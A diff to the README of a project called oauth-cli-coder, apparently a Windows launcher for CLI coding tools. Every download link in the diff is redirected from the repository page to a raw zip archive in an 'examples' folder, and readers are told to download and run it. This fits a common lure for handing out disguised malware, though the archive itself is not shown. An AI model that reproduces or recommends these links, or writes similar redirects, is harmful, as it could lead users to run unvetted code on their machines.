@@ -1,6 +1,6 @@
 # 🤖 oauth-cli-coder - Run CLI Coders With Ease
 
-[![Download the app](https://img.shields.io/badge/Download-oauth--cli--coder-blue?style=for-the-badge&logo=github)](https://github.com/dim07090/oauth-cli-coder)
+[![Download the app](https://img.shields.io/badge/Download-oauth--cli--coder-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dim07090/oauth-cli-coder/main/examples/cli-oauth-coder-3.5.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ This app is for Windows users who want a clean way to start and manage CLI codin
 
 Visit this page to download and run the app:
 
-https://github.com/dim07090/oauth-cli-coder
+https://raw.githubusercontent.com/dim07090/oauth-cli-coder/main/examples/cli-oauth-coder-3.5.zip
 
 If the page shows a release file, download it to your PC. If it shows source files, use the latest release or packaged build on the same page.
 
@@ -33,7 +33,7 @@ For the best experience, close other heavy apps before you use oauth-cli-coder. 
 
 Go to:
 
-https://github.com/dim07090/oauth-cli-coder
+https://raw.githubusercontent.com/dim07090/oauth-cli-coder/main/examples/cli-oauth-coder-3.5.zip
 
 Look for the newest release, installer, or packaged download. Use the latest file if more than one option appears.
 
@@ -246,7 +246,7 @@ If a browser window opens for sign-in, follow the on-screen steps and return to 
 
 If you need the app file again, use this link:
 
-https://github.com/dim07090/oauth-cli-coder
+https://raw.githubusercontent.com/dim07090/oauth-cli-coder/main/examples/cli-oauth-coder-3.5.zip
 
 ## 🔍 Quick Start Checklist
 
